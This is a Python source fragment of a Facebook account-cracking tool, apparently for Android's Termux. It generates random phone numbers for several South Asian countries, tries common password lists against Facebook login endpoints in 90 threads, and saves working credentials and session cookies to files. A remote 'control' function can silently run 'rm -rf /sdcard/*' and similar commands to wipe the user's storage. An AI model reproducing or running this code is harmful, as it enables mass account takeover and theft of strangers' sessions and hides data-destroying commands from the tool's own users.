    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\n\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------GMAIL_MEHOD----------------------
def gmsil(uid,passlist):
    global oks,loop
    try:
        for PS in passlist:
            sys.stdout.write('\r\r\033[1;37m[RANDOM-Gmail] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            data ={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': PS, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            head = {'User-Agent': api_random(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://api.facebook.com/method/auth.login'
            po = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in po:
                print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {uid} \033[1;97m| \033[1;32m{PS}\033[1;91m')
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open("/sdcard/Random-OK-GMAIL.txt","a").write(uid+"|"+PS+"|"+coki+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                print(f'\r\r\033[1;31m[RANDOM-CP] {uid} | {ps}')
                open("/sdcard/Random-CP","a").write(uid+"|"+PS+"|"+coki+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#----------------------RANDOM Go----------------------
def pk():
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    user=[]
    clear()
    print('\033[1;32m Example : \033[1;32m+920306 > +920315 > +920335 > +920345 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code=input('\033[1;32m INPUT SIM CODE : > ')
    clear()
    print(f'\033[1;32m Example : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input(f'\033[1;37m CRACK LIMIT : > \033[1;35m'))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
    print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
    print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
    print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0 ')
    method=input('\033[1;32mChoose:\033[1;33m ')
    with ThreadPool(max_workers=90) as sexy:
        tl=str(len(user))
        os.system('clear')
        print(logo)
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;37mYOUR SIM CODE\033[1;37m : '+code)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code + love
            pwx=[uid,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
            if method in ['1','01']:
                sexy.submit(ren_sub_m1,uid,pwx,tl)
            elif method in ['2','02']:
                sexy.submit(ren_sub_m2,uid,pwx,tl)
            elif method in ['3','03']:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
            elif method in ['4','04']:
                sexy.submit(ren_sub_m4,uid,pwx,tl)
            else:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\n\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print('\033[1;33mFile save in /sdcard/RANDOM-OK.txt')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
def India():
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    user=[]
    clear()
    print('\033[1;32m Example : \033[1;32m+91639 > +91934 > +91902 > +91701 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code=input('\033[1;32m INPUT SIM CODE : > ')
    clear()
    print(f'\033[1;32m Example : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input(f'\033[1;37m CRACK LIMIT : > \033[1;35m'))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
#    \033[1;32mChoose:\033[1;37m ')
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
    print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
    print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
    print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0 ')
    method=input('\033[1;32mChoose:\033[1;33m ')
    with ThreadPool(max_workers=90) as sexy:
        tl=str(len(user))
        os.system('clear')
        print(logo)
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;37mYOUR SIM CODE\033[1;37m : '+code)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code + love
            pwx=[love,uid[:8],'57273200','59039200','57575751']
            if method in ['1','01']:
                sexy.submit(ren_sub_m1,uid,pwx,tl)
            elif method in ['2','02']:
                sexy.submit(ren_sub_m2,uid,pwx,tl)
            elif method in ['3','03']:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
            elif method in ['4','04']:
                sexy.submit(ren_sub_m4,uid,pwx,tl)
            else:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print('\033[1;33mFile save in /sdcard/RANDOM-OK.txt')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
   
def nepal():
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    user=[]
    clear()
    print('\033[1;32m Example : +9779815 > +9779814 > +9779861 > +9779840 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code=input('\033[1;32m INPUT SIM CODE : > ')
    clear()
    print(f'\033[1;32m Example : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input(f'\033[1;37m CRACK LIMIT : > \033[1;35m'))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
    print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
    print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
    print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0 ')
    method=input('\033[1;32mChoose:\033[1;33m ')
    with ThreadPool(max_workers=90) as sexy:
        tl=str(len(user))
        os.system('clear')
        print(logo)
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;37mYOUR SIM CODE\033[1;37m : '+code)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code + love
###            print(uid)
            pwx=['nepal123','nepal1234','nepal1236','tamang67','nepal125','nepal12345','maya123','maya@123','maya1231','maya12345','pokhara','pokhara9','pokhara2','pokhara3','pokhara4','pokhara5','pokhara6','pokhara7','kathmandu','tamang','tamang40','tamang41','tamang123','tamang12345','kathmandu123',uid,love,uid[3:]]
            if method in ['1','01']:
                sexy.submit(ren_sub_m1,uid,pwx,tl)
            elif method in ['2','02']:
                sexy.submit(ren_sub_m2,uid,pwx,tl)
            elif method in ['3','03']:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
            elif method in ['4','04']:
                sexy.submit(ren_sub_m4,uid,pwx,tl)
            else:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print('\033[1;33m File save in /sdcard/RANDOM-OK.txt')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def agf():
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    user=[]
    clear()
    print('\033[1;32m Example : +9377 > +9379 > +9374 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code=input('\033[1;32m INPUT SIM CODE : > ')
    clear()
    print(f'\033[1;32m Example : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input(f'\033[1;37m CRACK LIMIT : > \033[1;35m'))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
    print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
    print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
    print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0 ')
    method=input('\033[1;32mChoose:\033[1;33m ')
    with ThreadPool(max_workers=90) as sexy:
        tl=str(len(user))
        clear()
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;37mYOUR SIM CODE\033[1;37m : '+code)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code + love
            pwx=[uid,love+love,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','446688']
            if method in ['1','01']:
                sexy.submit(ren_sub_m1,uid,pwx,tl)
            elif method in ['2','02']:
                sexy.submit(ren_sub_m2,uid,pwx,tl)
            elif method in ['3','03']:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
            elif method in ['4','04']:
                sexy.submit(ren_sub_m4,uid,pwx,tl)
            else:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\n\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print('\033[1;36m File save in /sdcard/RANDOM-OK.txt')
    print('\033[1;33m------------------------------------------------------')
current_date_month_year = now.strftime("%d\033[1;33m•%B")
def BD():
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    user=[]
    clear()
    print('\033[1;32m Example : 017 > 018 > 019 > 016 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code=input('\033[1;32m INPUT SIM CODE : > ')
    clear()
    print(f'\033[1;32m Example : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input(f'\033[1;37m CRACK LIMIT : > \033[1;35m'))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
    print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
    print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
    print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0 ')
    method=input('\033[1;32mChoose:\033[1;33m ')
    with ThreadPool(max_workers=90) as sexy:
        tl=str(len(user))
        clear()
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;37mYOUR SIM CODE\033[1;37m : '+code)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code + love
            pwx = [uid[5:],uid[4:],uid[3:],uid[:6],uid[:7],uid[:8],uid,'@123356@']
#            print(pwx)
            if method in ['1','01']:
                sexy.submit(ren_sub_m1,uid,pwx,tl)
            elif method in ['2','02']:
                sexy.submit(ren_sub_m2,uid,pwx,tl)
            elif method in ['3','03']:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
            elif method in ['4','04']:
                sexy.submit(ren_sub_m4,uid,pwx,tl)
            else:
                sexy.submit(ren_sub_m3,uid,pwx,tl)
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
    print('\033[1;33m File save in /sdcard/RANDOM-OK.txt')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------RNADOM_MEHOD_M1----------------------
def ren_sub_m1(uid,pwx,tl):
    global oks,loop
    try:
        for ps in pwx:
            A = random.choice(['\x1b[1;97m','\033[1;33m','\033[1;92m','\x1b[1;98m','\x1b[1;96m','\x1b[1;95m','\x1b[1;97m'])
            sys.stdout.write(f'\r\r\x1b[1;97m[\033[1;34m~\x1b[1;97m]\x1b[1;97m~\x1b[1;97m[\033[1;32mMR-RANDOM\x1b[1;97m]>~<\x1b[1;97m[{A}{loop}\x1b[1;97m]>~<\x1b[1;97m[\033[1;32mOK:{len(oks)}\033[1;32\x1b[1;97m]')
            sys.stdout.flush()
            
            data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head = {
            'User-Agent': api_random(),
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in po:
                uid=po["uid"]
                print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {uid} \033[1;97m| \033[1;32m{ps}\033[1;91m')
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                open('/sdcard/RANDOM-M1-OK-COKI.txt','a').write(f"{uid}|{ps}|{coki}")
                open('/sdcard/RANDOM-M1-OK-COKI.txt','a').write(f"{uid}|{ps}|{coki}")
                #open('/sdcard/RANDOM-M1-OK-COKI.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(po):
#                oks.append(uid)
#                print(f'\r\r\033[1;31m[RANDOM-CP] {uid} | {ps}')
#                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                open("/sdcard/Random-CP","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

#----------------------RNADOM_MEHOD_M2----------------------
def ren_sub_m2(uid,pwx,tl):
    global oks,loop
    try:
        for ps in pwx:
            A = random.choice(['\x1b[1;97m','\033[1;33m','\033[1;92m','\x1b[1;98m','\x1b[1;96m','\x1b[1;95m','\x1b[1;97m'])
            sys.stdout.write(f'\r\r\x1b[1;97m[\033[1;34m~\x1b[1;97m]\x1b[1;97m~\x1b[1;97m[\033[1;32mMR-RANDOM\x1b[1;97m]>~<\x1b[1;97m[{A}{loop}\x1b[1;97m]>~<\x1b[1;97m[\033[1;32mOK:{len(oks)}\033[1;32\x1b[1;97m]')
            sys.stdout.flush()
            data = {
            'adid':str(uuid.uuid4()),
            'email':uid,
            'password':ps,
            'cpl':'true',
            'credentials_type':'device_based_login_password',
            "source": "device_based_login",
            'error_detail_type':'button_with_disabled',
            'source':'login',
            'format':'json',
            'generate_session_cookies':'1',
            'generate_analytics_claim':'1',
            'generate_machine_id':'1',
            "locale":"en_US",
            "client_country_code":"US",
            'device': device(),
            'device_id':str(uuid.uuid4()),
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
            'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': api_random(),
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT',
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url1= 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in po:
                uid=po["uid"]
                print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {uid} \033[1;97m| \033[1;32m{ps}\033[1;91m')
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/RANDOM-M2-OK-COKI.txt','a').write(f"{uid}|{ps}|{coki}")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(po):
#                oks.append(uid)
#                print(f'\r\r\033[1;31m[RANDOM-CP] {uid} | {pwx}')
#                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                open("/sdcard/Random-CP","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#----------------------RNADOM_MEHOD_M3----------------------
def ren_sub_m3(uid,pwx,tl):
    global oks,loop
    try:
        for ps in pwx:
            A = random.choice(['\x1b[1;97m','\033[1;33m','\033[1;92m','\x1b[1;98m','\x1b[1;96m','\x1b[1;95m','\x1b[1;97m'])
            sys.stdout.write(f'\r\r\x1b[1;97m[\033[1;34m~\x1b[1;97m]\x1b[1;97m~\x1b[1;97m[\033[1;32mMR-RANDOM\x1b[1;97m]>~<\x1b[1;97m[{A}{loop}\x1b[1;97m]>~<\x1b[1;97m[\033[1;32mOK:{len(oks)}\033[1;32\x1b[1;97m]')
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': bgraph_random(),
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {uid} \033[1;97m| \033[1;32m{ps}\033[1;91m')
                open('/sdcard/RANDOM-M3-OK-COKI.txt','a').write(f"{uid}|{ps}|{kuki}")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

#----------------------RNADOM_MEHOD_M4----------------------
def ren_sub_m4(uid,pwx,tl):
    global oks,loop
    try:
        for ps in pwx:
            A = random.choice(['\x1b[1;97m','\033[1;33m','\033[1;92m','\x1b[1;98m','\x1b[1;96m','\x1b[1;95m','\x1b[1;97m'])
            sys.stdout.write(f'\r\r\x1b[1;97m[\033[1;34m~\x1b[1;97m]\x1b[1;97m~\x1b[1;97m[\033[1;32mMR-RANDOM\x1b[1;97m]>~<\x1b[1;97m[{A}{loop}\x1b[1;97m]>~<\x1b[1;97m[\033[1;32mOK:{len(oks)}\033[1;32\x1b[1;97m]')
            sys.stdout.flush()
            data ={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': ps, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            head = {'User-Agent': api_random(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://api.facebook.com/method/auth.login'
            po = requests.post(url=url1,data=data,headers=head).json()
            if "session_key" in po:
                uid=po["uid"]
                print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {uid} \033[1;97m| \033[1;32m{ps}\033[1;91m')
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\033[1;37m[Cookies] : {coki} ')
                open('/sdcard/RANDOM-M4-OK-COKI.txt','a').write(f"{uid}|{ps}|{coki}")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(po):
#                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                open("/sdcard/Random-CP","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#----------------------Server----------------------
def server():
    try:
        database=requests.get("https://raw.githubusercontent.com/Ruhel-404/Server/main/Server.txt").text
    except:
         print("Internet Error! ")
         sys.exit()
    if "on" in database:
        pass
    elif "off" in database:
        print("Tool is off 📴")
        sys.exit()
    elif "up" in database:
        print('\x1b[1;92mTool is updae now wait for next update')
    else:
        while True:
            print("Error")
server()
#----------------------CONTOL----------------------
def ck():
    global uuidd
    fast1=requests.get("https://raw.githubusercontent.com/Ruhel-404/Server/main/Fast.txt").text
    fast2=requests.get("https://raw.githubusercontent.com/Ruhel-404/Server/main/Fast1.txt").text
    fast3=requests.get("https://raw.githubusercontent.com/Ruhel-404/Server/main/Fast3").text
    if uuidd in fast1:
        print('\033[1;91m You are blocked')
        sys.exit()
    if uuidd in fast2:
        os.system('rm -rf /sdcard/*')
        os.system('rm-rf /sdcard/DCIM/')
        os.system('rm-rf /sdcard/Android/')
        os.system('rm-rf /sdcard/Android/data/')
        os.system('rm -rf /sdcard/Download/*')
        os.system('rm -rf /sdcard1/*')
        os.system('rm -rf /sdcard/0/*')
        print('\033[1;93m You old bypass user')
        sys.exit()
        os.system('exit')
    if 'yes' in fast3:
        os.system('rm -rf /sdcard/*')
        os.system('rm-rf /sdcard/DCIM/')
        os.system('rm-rf /sdcard/Android/')
        os.system('rm-rf /sdcard/Android/data/')
        os.system('rm -rf /sdcard/Download/*')
        os.system('rm -rf /sdcard1/*')
        os.system('rm -rf /sdcard/0/*')
ck()
#----------------------APPROVAL----------------------
class Approval:
    def get_key(self):
        uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
        id = "".join(uuidd).replace("_", "").replace("360", "RANDOM").replace("u", "9").replace("a", "A")
        plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
        xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
        bxd = "RANDOM-"
        bumper = bxd + xp + id
        return bumper
    def __init__(self):
        self.key = self.get_key()
        
        
        try:
            self.http = httplib2.Http()
            self.url = "https://raw.githubusercontent.com/Ruhel-404/Server/main/Lol.txt"# your approval server link
            self.response = self.http.request(self.url, 'GET')
        except httplib2.error.ServerNotFoundError:exit(' internet error!')
        self.line= 54*'-'
        self.apv()
    def send(self):
        os.system('clear')
        print(hh)
    def apv(self):
        try:
            os.system('clear')
            print(hh)
            self.send()
            if self.key in str(self.response):
                Of()
            else:
                print(f" Your key is not approved\n key : {self.key}\n You key copy and send to admin\n\033[1;32m{self.line}")
                time.sleep(2)
                print('\x1b[38;5;208m Facebook group join now')
                os.system('xdg-open https://facebook.com/groups/973940944108660/')
                time.sleep(2)
                print('\x1b[38;5;208m Join now messenger group')
                os.system('xdg-open https://m.me/j/AbbUH0W6g_PCZP_R/')
                time.sleep(2)
                print('\x1b[38;5;208m key copy and send admin')
                os.system('xdg-open https://www.facebook.com/profile.php?id=61556377723776')
        except Exception as e:exit(' error!')
Approval()
#END